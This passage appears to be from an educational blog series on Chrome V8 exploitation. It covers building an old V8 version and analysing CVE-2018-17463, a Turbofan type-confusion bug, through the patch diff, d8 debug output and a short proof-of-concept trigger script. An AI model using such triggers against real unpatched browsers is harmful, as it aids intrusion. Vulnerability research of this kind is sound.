&lt;p&gt;The &lt;strong&gt;D8&lt;/strong&gt; used here is V8&amp;#x2019;s developer/debug shell. With D8 you can run V8 without a browser and use debugging flags like &lt;code&gt;--print-bytecode&lt;/code&gt; to inspect the engine&amp;#x2019;s internals. It&amp;#x2019;s an excellent tool for analyzing how V8 generates and runs bytecode. In this part we&amp;#x2019;ll use D8 thoroughly, step-by-step, to follow the exploit process.&lt;/p&gt;
&lt;p&gt;The analysis post I referenced is: &lt;a href=&#34;https://jhalon.github.io/chrome-browser-exploitation-3/&#34;&gt;https://jhalon.github.io/chrome-browser-exploitation-3/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Now let&amp;#x2019;s roll back the git version to trigger the vulnerability in a real V8 build.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;C:\dev\source\v8&amp;gt;git checkout &lt;span class=&#34;hljs-number&#34;&gt;568979f&lt;/span&gt;4d891bafec875fab20f608ff9392f4f29
Updating files: &lt;span class=&#34;hljs-number&#34;&gt;100&lt;/span&gt;% (&lt;span class=&#34;hljs-number&#34;&gt;15550&lt;/span&gt;/&lt;span class=&#34;hljs-number&#34;&gt;15550&lt;/span&gt;), done.
Previous HEAD position was b801900344f [gtest] Clean up single-arg `testing::Invoke()`s
HEAD is now at &lt;span class=&#34;hljs-number&#34;&gt;568979f&lt;/span&gt;4d89 [parser] Fix memory accounting of explicitly cleared zones&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;To build that version you&amp;#x2019;ll need to install the following additional items.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;MSVC v140 - VS 2015 C++ build tools (v14.00)&lt;/li&gt;
&lt;li&gt;MSVC v141 - VS 2017 C++ x64/x86 build tools (v14.16)&lt;/li&gt;
&lt;li&gt;Windows 10 SDK (10.0.17134.0)&lt;ul&gt;
&lt;li&gt;If you have a nearby version, you can copy the SDK folder and rename it to match. I installed &lt;code&gt;10.0.19041.0&lt;/code&gt; and renamed the folder to &lt;code&gt;10.0.17134.0&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;C:\dev\source\v8&amp;gt;gn gen --ide=vs out\x64.debug
ERROR at &lt;span class=&#34;hljs-comment&#34;&gt;//.gn:24:48: No value named &amp;quot;exec_script_whitelist&amp;quot; in scope &amp;quot;build_dotfile_settings&amp;quot;&lt;/span&gt;
exec_script_whitelist = build_dotfile_settings.exec_script_whitelist + []&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;It won&amp;#x2019;t work right away! Because these are old versions, you must also align (sync) the build tools to those older toolchains. &lt;del&gt;(2018 already&amp;#x2026; seven years ago &amp;#x2014; TMI, but I was 20 in 2018, hehe.)&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;Run &lt;code&gt;gclient sync&lt;/code&gt; to sync the build toolchain. Since the build requires Python 2, make sure &lt;code&gt;where python&lt;/code&gt; lists the Python 2 binary first in your PATH.&lt;br&gt;Also set the following environment variable:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;set GYP_MSVS_OVERRIDE_PATH=C:\Program Files (x86)\Microsoft Visual Studio 14.0&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;After that, the build should succeed.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;c:\dev\source\v8&amp;gt;gclient sync
...
Running hooks: &lt;span class=&#34;hljs-number&#34;&gt;100&lt;/span&gt;% (&lt;span class=&#34;hljs-number&#34;&gt;30&lt;/span&gt;/&lt;span class=&#34;hljs-number&#34;&gt;30&lt;/span&gt;), done&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;When building Chrome you may see errors like the one below &amp;#x2014; the flags differ depending on whether the sandbox existed at that time.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;c:\dev\source\v8&amp;gt;gn gen --ide=vs out\x64.debug
Generating Visual Studio projects took &lt;span class=&#34;hljs-number&#34;&gt;96&lt;/span&gt;ms
Done. Made &lt;span class=&#34;hljs-number&#34;&gt;129&lt;/span&gt; targets from &lt;span class=&#34;hljs-number&#34;&gt;74&lt;/span&gt; files in &lt;span class=&#34;hljs-number&#34;&gt;1597&lt;/span&gt;ms&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;I couldn&amp;#x2019;t get the ninja build to work here; if you can, proceed on Windows using the steps above. If not, you can build on Linux. In Part 4 I plan to cover a 2023 1-day exploit and I&amp;#x2019;ll do that hands-on on Windows!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;2-CVE-2018-17463&#34;&gt;&lt;a href=&#34;#2-CVE-2018-17463&#34; class=&#34;headerlink&#34; title=&#34;2. CVE-2018-17463&#34;&gt;&lt;/a&gt;2. CVE-2018-17463&lt;/h1&gt;&lt;p&gt;CVE-2018-17463 is a Type Confusion vulnerability in &lt;code&gt;Google Chrome Versions 69.0 and before&lt;/code&gt; that allows RCE from the renderer. Let&amp;#x2019;s analyze how this was possible, starting from the root cause.&lt;/p&gt;
&lt;h2 id=&#34;2-1-Root-Cause&#34;&gt;&lt;a href=&#34;#2-1-Root-Cause&#34; class=&#34;headerlink&#34; title=&#34;2.1 Root Cause&#34;&gt;&lt;/a&gt;2.1 &lt;strong&gt;Root Cause&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;The JIT compiler Turbofan performs optimizations by detecting and eliminating duplicate IR. However, if it operates incorrectly it can remove safety checks like &lt;code&gt;type check&lt;/code&gt;, and that is where Type Confusion can occur.&lt;/p&gt;
&lt;h3 id=&#34;Patch-Diffing&#34;&gt;&lt;a href=&#34;#Patch-Diffing&#34; class=&#34;headerlink&#34; title=&#34;Patch Diffing&#34;&gt;&lt;/a&gt;&lt;strong&gt;Patch Diffing&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;If you look at &lt;a href=&#34;https://bugs.chromium.org/p/chromium/issues/detail?id=888923&#34;&gt;Issue 888923&lt;/a&gt;, you&amp;#x2019;ll find a &lt;a href=&#34;https://chromium.googlesource.com/v8/v8.git/+/52a9e67a477bdb67ca893c25c145ef5191976220&#34;&gt;commit&lt;/a&gt; &lt;code&gt;52a9e67a477bdb67ca893c25c145ef5191976220&lt;/code&gt; with the message:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;[turbofan] Fix ObjectCreate&amp;#x2019;s side effect annotation.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Examining that change shows that in the JavaScript operation &lt;code&gt;CreateObject&lt;/code&gt; the flag &lt;code&gt;Operator::kNoWrite&lt;/code&gt; was changed to &lt;code&gt;Operator::kNoProperties&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;C:\dev\source\v8&amp;gt;git show &lt;span class=&#34;hljs-number&#34;&gt;52&lt;/span&gt;a9e67a477bdb67ca893c25c145ef5191976220
commit &lt;span class=&#34;hljs-number&#34;&gt;52&lt;/span&gt;a9e67a477bdb67ca893c25c145ef5191976220
Author: Jaroslav Sevcik &amp;lt;jarin@chromium.org&amp;gt;
Date:   Wed Sep &lt;span class=&#34;hljs-number&#34;&gt;26&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;13&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;23&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;47&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;2018&lt;/span&gt; +&lt;span class=&#34;hljs-number&#34;&gt;0200&lt;/span&gt;

    [turbofan] Fix ObjectCreate&lt;span class=&#34;hljs-number&#34;&gt;&amp;apos;&lt;/span&gt;s side effect annotation.

    Bug: chromium:&lt;span class=&#34;hljs-number&#34;&gt;888923&lt;/span&gt;
    Change-Id: Ifb22cd9b34f53de3cf6e47cd92f3c0abeb10ac79
    Reviewed-on: https:&lt;span class=&#34;hljs-comment&#34;&gt;//chromium-review.googlesource.com/1245763&lt;/span&gt;
    Reviewed-by: Benedikt Meurer &amp;lt;bmeurer@chromium.org&amp;gt;
    Commit-Queue: Jaroslav Sevcik &amp;lt;jarin@chromium.org&amp;gt;
    Cr-Commit-Position: refs/heads/master@{#&lt;span class=&#34;hljs-number&#34;&gt;56236&lt;/span&gt;}

diff --git a/src/compiler/js-&lt;span class=&#34;hljs-keyword&#34;&gt;operator&lt;/span&gt;.cc b/src/compiler/js-&lt;span class=&#34;hljs-keyword&#34;&gt;operator&lt;/span&gt;.cc
index &lt;span class=&#34;hljs-number&#34;&gt;94b&lt;/span&gt;018c987d.&lt;span class=&#34;hljs-number&#34;&gt;.5&lt;/span&gt;ed3f74e075 &lt;span class=&#34;hljs-number&#34;&gt;100644&lt;/span&gt;
--- a/src/compiler/js-&lt;span class=&#34;hljs-keyword&#34;&gt;operator&lt;/span&gt;.cc
+++ b/src/compiler/js-&lt;span class=&#34;hljs-keyword&#34;&gt;operator&lt;/span&gt;.cc
@@ &lt;span class=&#34;hljs-number&#34;&gt;-622&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt; +&lt;span class=&#34;hljs-number&#34;&gt;622&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt; @@ &lt;span class=&#34;hljs-function&#34;&gt;CompareOperationHint &lt;span class=&#34;hljs-title&#34;&gt;CompareOperationHintOf&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; Operator* op)&lt;/span&gt; &lt;/span&gt;{
   V(CreateKeyValueArray, Operator::kEliminatable, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)                \
   V(CreatePromise, Operator::kEliminatable, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)                      \
   V(CreateTypedArray, Operator::kNoProperties, &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)                   \
-  V(CreateObject, Operator::kNoWrite, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)                            \
+  V(CreateObject, Operator::kNoProperties, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)                       \
   V(ObjectIsArray, Operator::kNoProperties, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)                      \
   V(HasProperty, Operator::kNoProperties, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)                        \
   V(HasInPrototypeChain, Operator::kNoProperties, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)                \
diff --git a/test/mjsunit/compiler/regress&lt;span class=&#34;hljs-number&#34;&gt;-888923.&lt;/span&gt;js b/test/mjsunit/compiler/regress&lt;span class=&#34;hljs-number&#34;&gt;-888923.&lt;/span&gt;js
&lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; file mode &lt;span class=&#34;hljs-number&#34;&gt;100644&lt;/span&gt;
...&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;NoWrite&lt;/code&gt; means &amp;#x201C;the object&amp;#x2019;s state will not be mutated&amp;#x201D; (i.e., no additional memory updates). During this operation there was a side effect that changed the properties&amp;#x2019; layout (the Map), so the fix was to indicate &amp;#x201C;this object&amp;#x2019;s properties do not change&amp;#x201D; to prevent the optimizer from assuming the Map is unmodified.&lt;/p&gt;
&lt;h3 id=&#34;Code-Review&#34;&gt;&lt;a href=&#34;#Code-Review&#34; class=&#34;headerlink&#34; title=&#34;Code Review&#34;&gt;&lt;/a&gt;Code Review&lt;/h3&gt;&lt;p&gt;When you call &lt;code&gt;Object.create(proto)&lt;/code&gt; in JavaScript, it creates a new object and directly sets that object&amp;#x2019;s &lt;code&gt;[[Prototype]]&lt;/code&gt; to &lt;code&gt;proto&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;For example:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; animal = { &lt;span class=&#34;hljs-attr&#34;&gt;type&lt;/span&gt;: &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;animal&amp;quot;&lt;/span&gt; };
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; dog = &lt;span class=&#34;hljs-built_in&#34;&gt;Object&lt;/span&gt;.create(animal);
&lt;span class=&#34;hljs-built_in&#34;&gt;console&lt;/span&gt;.log(dog.type); &lt;span class=&#34;hljs-comment&#34;&gt;// &amp;quot;animal&amp;quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Here &lt;code&gt;dog&lt;/code&gt; does not have its own &lt;code&gt;type&lt;/code&gt; property, but because its &lt;code&gt;[[Prototype]]&lt;/code&gt; points to &lt;code&gt;animal&lt;/code&gt;, &lt;code&gt;dog.type&lt;/code&gt; resolves to &lt;code&gt;&amp;quot;animal&amp;quot;&lt;/code&gt;. Thus &lt;code&gt;Object.create&lt;/code&gt; acts as a &amp;#x201C;glue&amp;#x201D; that starts a new prototype chain.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;JavaScript objects and the prototype chain&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Every object in JavaScript internally has a hidden link called &lt;code&gt;[[Prototype]]&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;This link points to another object (the prototype), which may in turn have its own prototype.&lt;/li&gt;
&lt;li&gt;The linked sequence forms the &lt;strong&gt;prototype chain&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;When JS looks up a property or method:&lt;ol&gt;
&lt;li&gt;It checks the object itself.&lt;/li&gt;
&lt;li&gt;If not found, it follows &lt;code&gt;[[Prototype]]&lt;/code&gt; upwards.&lt;/li&gt;
&lt;li&gt;It repeats until it reaches &lt;code&gt;null&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;image%202.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Let&amp;#x2019;s follow how the &lt;code&gt;ObjectCreate&lt;/code&gt; function constructs a new map. The &lt;code&gt;ObjectCreate&lt;/code&gt; function takes the prototype as an argument and calls &lt;code&gt;GetObjectCreateMap&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image%203.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;GetObjectCreateMap&lt;/code&gt;&amp;#x2019;s job is to &lt;strong&gt;return the Object Create Map appropriate for the given prototype&lt;/strong&gt;. This is where a side effect can occur.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;JSObject::OptimizeAsPrototype&lt;/code&gt;: Converts the given object into a &amp;#x201C;prototype-optimized&amp;#x201D; state &amp;#x2014; i.e., transforms a regular object into a prototype object.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Map::TransitionToPrototype&lt;/code&gt;: Transitions the map to match the new prototype &amp;#x2014; in other words, it changes the map&amp;#x2019;s linkage/structure.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;This matters because the code is effectively doing &amp;#x201C;the newly created object becomes a prototype object, and the map associated with that object is changed at the same time.&amp;#x201D; Therefore, simply calling &lt;code&gt;Object.create(proto)&lt;/code&gt; can cause &lt;strong&gt;the object to become a prototype object and its associated map layout to change&lt;/strong&gt;.&lt;/p&gt;
&lt;h3 id=&#34;Practice&#34;&gt;&lt;a href=&#34;#Practice&#34; class=&#34;headerlink&#34; title=&#34;Practice&#34;&gt;&lt;/a&gt;Practice&lt;/h3&gt;&lt;p&gt;Now let&amp;#x2019;s verify this in &lt;code&gt;d8&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;C:\dev\source\v8&amp;gt;out\x64.debug\d8 --allow-natives-syntax
V8 version &lt;span class=&#34;hljs-number&#34;&gt;14.2&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.0&lt;/span&gt; (candidate)
d8&amp;gt; let obj = {x:&lt;span class=&#34;hljs-number&#34;&gt;13&lt;/span&gt;};
undefined
d8&amp;gt; %DebugPrint(obj)
DebugPrint: &lt;span class=&#34;hljs-number&#34;&gt;0x21700389515&lt;/span&gt;: [JS_OBJECT_TYPE]
 - &lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;0x02170006c2fd&lt;/span&gt; &amp;lt;Map[&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;](HOLEY_ELEMENTS)&amp;gt; [FastProperties]
 - prototype: &lt;span class=&#34;hljs-number&#34;&gt;0x0217000545fd&lt;/span&gt; &amp;lt;Object &lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt; = &lt;span class=&#34;hljs-number&#34;&gt;0000021700053979&lt;/span&gt;&amp;gt;
 - elements: &lt;span class=&#34;hljs-number&#34;&gt;0x0217000007bd&lt;/span&gt; &amp;lt;FixedArray[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;]&amp;gt; [HOLEY_ELEMENTS]
 - properties: &lt;span class=&#34;hljs-number&#34;&gt;0x0217000007bd&lt;/span&gt; &amp;lt;FixedArray[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;]&amp;gt;
 - All own properties (excluding elements): {
    &lt;span class=&#34;hljs-number&#34;&gt;0x21700003601&lt;/span&gt;: [String] in ReadOnlySpace: #x: &lt;span class=&#34;hljs-number&#34;&gt;13&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; data field &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, attrs: [WEC]) @ Any, location: in-object
 }
&lt;span class=&#34;hljs-number&#34;&gt;0x2170006c2fd&lt;/span&gt;: [Map] in OldSpace
 - &lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;0x021700053419&lt;/span&gt; &amp;lt;MetaMap (&lt;span class=&#34;hljs-number&#34;&gt;0x021700053469&lt;/span&gt; &amp;lt;NativeContext[&lt;span class=&#34;hljs-number&#34;&gt;300&lt;/span&gt;]&amp;gt;)&amp;gt;
 - type: JS_OBJECT_TYPE
 - instance size: &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;  
 - inobject properties: &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;
 - unused property fields: &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;
 - elements kind: HOLEY_ELEMENTS
 - &lt;span class=&#34;hljs-keyword&#34;&gt;enum&lt;/span&gt; length: invalid
 - stable_map
 - back pointer: &lt;span class=&#34;hljs-number&#34;&gt;0x02170006c2d5&lt;/span&gt; &amp;lt;Map[&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;](HOLEY_ELEMENTS)&amp;gt;
 - prototype_validity_cell: &lt;span class=&#34;hljs-number&#34;&gt;0x021700000ac9&lt;/span&gt; &amp;lt;Cell value= [cleared]&amp;gt;
 - instance descriptors (own) #&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;0x021700389525&lt;/span&gt; &amp;lt;DescriptorArray[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;]&amp;gt;
 - prototype: &lt;span class=&#34;hljs-number&#34;&gt;0x0217000545fd&lt;/span&gt; &amp;lt;Object &lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt; = &lt;span class=&#34;hljs-number&#34;&gt;0000021700053979&lt;/span&gt;&amp;gt;
 - constructor: &lt;span class=&#34;hljs-number&#34;&gt;0x021700053e91&lt;/span&gt; &amp;lt;JSFunction Object (sfi = &lt;span class=&#34;hljs-number&#34;&gt;0000021700351&lt;/span&gt;A15)&amp;gt;
 - dependent code: &lt;span class=&#34;hljs-number&#34;&gt;0x0217000007cd&lt;/span&gt; &amp;lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&amp;gt;
 - construction counter: &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;

{x: &lt;span class=&#34;hljs-number&#34;&gt;13&lt;/span&gt;}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;An object like the one above is created. Now call &lt;code&gt;Object.create&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;d8&amp;gt; Object.create(obj)
{}
d8&amp;gt; %DebugPrint(obj)
DebugPrint: &lt;span class=&#34;hljs-number&#34;&gt;0x21700389515&lt;/span&gt;: [JS_OBJECT_TYPE]
 - &lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;0x02170006d05d&lt;/span&gt; &amp;lt;Map[&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;](HOLEY_ELEMENTS)&amp;gt; [DictionaryProperties]
 - prototype: &lt;span class=&#34;hljs-number&#34;&gt;0x0217000545fd&lt;/span&gt; &amp;lt;Object &lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt; = &lt;span class=&#34;hljs-number&#34;&gt;0000021700053979&lt;/span&gt;&amp;gt;
 - elements: &lt;span class=&#34;hljs-number&#34;&gt;0x0217000007bd&lt;/span&gt; &amp;lt;FixedArray[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;]&amp;gt; [HOLEY_ELEMENTS]
 - properties: &lt;span class=&#34;hljs-number&#34;&gt;0x02170038b3dd&lt;/span&gt; &amp;lt;NameDictionary[&lt;span class=&#34;hljs-number&#34;&gt;18&lt;/span&gt;]&amp;gt;
 - All own properties (excluding elements): {
   x: &lt;span class=&#34;hljs-number&#34;&gt;13&lt;/span&gt; (data, dict_index: &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, attrs: [WEC])
 }
&lt;span class=&#34;hljs-number&#34;&gt;0x2170006d05d&lt;/span&gt;: [Map] in OldSpace
 - &lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;0x021700053419&lt;/span&gt; &amp;lt;MetaMap (&lt;span class=&#34;hljs-number&#34;&gt;0x021700053469&lt;/span&gt; &amp;lt;NativeContext[&lt;span class=&#34;hljs-number&#34;&gt;300&lt;/span&gt;]&amp;gt;)&amp;gt;
 - type: JS_OBJECT_TYPE
 - instance size: &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;
 - inobject properties: &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;
 - unused property fields: &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;
 - elements kind: HOLEY_ELEMENTS
 - &lt;span class=&#34;hljs-keyword&#34;&gt;enum&lt;/span&gt; length: invalid
 - dictionary_map
 - may_have_interesting_properties
 - prototype_map
 - prototype info: &lt;span class=&#34;hljs-number&#34;&gt;0x02170006d085&lt;/span&gt; &amp;lt;PrototypeInfo&amp;gt;
 - prototype_validity_cell: &lt;span class=&#34;hljs-number&#34;&gt;0x021700000ac9&lt;/span&gt; &amp;lt;Cell value= [cleared]&amp;gt;
 - instance descriptors (own) #&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;0x0217000007e5&lt;/span&gt; &amp;lt;DescriptorArray[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;]&amp;gt;
 - prototype: &lt;span class=&#34;hljs-number&#34;&gt;0x0217000545fd&lt;/span&gt; &amp;lt;Object &lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt; = &lt;span class=&#34;hljs-number&#34;&gt;0000021700053979&lt;/span&gt;&amp;gt;
 - constructor: &lt;span class=&#34;hljs-number&#34;&gt;0x021700053e91&lt;/span&gt; &amp;lt;JSFunction Object (sfi = &lt;span class=&#34;hljs-number&#34;&gt;0000021700351&lt;/span&gt;A15)&amp;gt;
 - dependent code: &lt;span class=&#34;hljs-number&#34;&gt;0x0217000007cd&lt;/span&gt; &amp;lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&amp;gt;
 - construction counter: &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;

{x: &lt;span class=&#34;hljs-number&#34;&gt;13&lt;/span&gt;}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;After the function call, you can see the map changed from &lt;code&gt;FastProperties&lt;/code&gt; to &lt;code&gt;DictionaryProperties&lt;/code&gt;. That means the &lt;code&gt;NoWrite&lt;/code&gt; assumption is invalid. If there is no operation checking the map before and after the function call, that can lead to Type Confusion.&lt;/p&gt;
&lt;h2 id=&#34;2-2-Proof-of-Concept&#34;&gt;&lt;a href=&#34;#2-2-Proof-of-Concept&#34; class=&#34;headerlink&#34; title=&#34;2.2 Proof of Concept&#34;&gt;&lt;/a&gt;2.2 Proof of Concept&lt;/h2&gt;&lt;h3 id=&#34;Type-Confusion-PoC&#34;&gt;&lt;a href=&#34;#Type-Confusion-PoC&#34; class=&#34;headerlink&#34; title=&#34;Type Confusion PoC&#34;&gt;&lt;/a&gt;Type Confusion PoC&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;function &lt;span class=&#34;hljs-title&#34;&gt;vuln&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(obj)&lt;/span&gt; &lt;/span&gt;{
    &lt;span class=&#34;hljs-comment&#34;&gt;// Access Property a of obj, forcing a CheckMap operation&lt;/span&gt;
    obj.a;

    &lt;span class=&#34;hljs-comment&#34;&gt;// Force a Map Transition via our side-effect&lt;/span&gt;
    Object.create(obj)

    &lt;span class=&#34;hljs-comment&#34;&gt;// Trigger our type-confusion by accessing an out-of-bound property&lt;/span&gt;
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; obj.b;
}

vuln({a:&lt;span class=&#34;hljs-number&#34;&gt;42&lt;/span&gt;, b:&lt;span class=&#34;hljs-number&#34;&gt;43&lt;/span&gt;}); &lt;span class=&#34;hljs-comment&#34;&gt;// Warm-up code&lt;/span&gt;
vuln({a:&lt;span class=&#34;hljs-number&#34;&gt;42&lt;/span&gt;, b:&lt;span class=&#34;hljs-number&#34;&gt;43&lt;/span&gt;});
%OptimizeFunctionOnNextCall(vuln); &lt;span class=&#34;hljs-comment&#34;&gt;// JIT Compile vuln&lt;/span&gt;
vuln({a:&lt;span class=&#34;hljs-number&#34;&gt;42&lt;/span&gt;, b:&lt;span class=&#34;hljs-number&#34;&gt;43&lt;/span&gt;}); &lt;span class=&#34;hljs-comment&#34;&gt;// Trigger type-confusion - should not return 43!&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Let&amp;#x2019;s trigger Type Confusion using &lt;code&gt;Object.create&lt;/code&gt;. Run &lt;code&gt;d8&lt;/code&gt; with the &lt;code&gt;--allow-natives-syntax&lt;/code&gt; flag and enter the following:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs css&#34;&gt;&lt;span class=&#34;hljs-selector-tag&#34;&gt;d8&lt;/span&gt;&amp;gt; &lt;span class=&#34;hljs-selector-tag&#34;&gt;vuln&lt;/span&gt;({&lt;span class=&#34;hljs-attribute&#34;&gt;a&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;42&lt;/span&gt;, b:&lt;span class=&#34;hljs-number&#34;&gt;43&lt;/span&gt;})
43
&lt;span class=&#34;hljs-selector-tag&#34;&gt;d8&lt;/span&gt;&amp;gt; &lt;span class=&#34;hljs-selector-tag&#34;&gt;vuln&lt;/span&gt;({&lt;span class=&#34;hljs-attribute&#34;&gt;a&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;42&lt;/span&gt;, b:&lt;span class=&#34;hljs-number&#34;&gt;43&lt;/span&gt;})
43
&lt;span class=&#34;hljs-selector-tag&#34;&gt;d8&lt;/span&gt;&amp;gt; %&lt;span class=&#34;hljs-selector-tag&#34;&gt;OptimizeFunctionOnNextCall&lt;/span&gt;(&lt;span class=&#34;hljs-selector-tag&#34;&gt;vuln&lt;/span&gt;)
&lt;span class=&#34;hljs-selector-tag&#34;&gt;undefined&lt;/span&gt;
&lt;span class=&#34;hljs-selector-tag&#34;&gt;d8&lt;/span&gt;&amp;gt; &lt;span class=&#34;hljs-selector-tag&#34;&gt;vuln&lt;/span&gt;({&lt;span class=&#34;hljs-attribute&#34;&gt;a&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;42&lt;/span&gt;, b:&lt;span class=&#34;hljs-number&#34;&gt;43&lt;/span&gt;})
0&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;In the optimized (compiled) code you can observe that the return value differs.&lt;/p&gt;
&lt;p&gt;If you look at the IR graph,&lt;/p&gt;
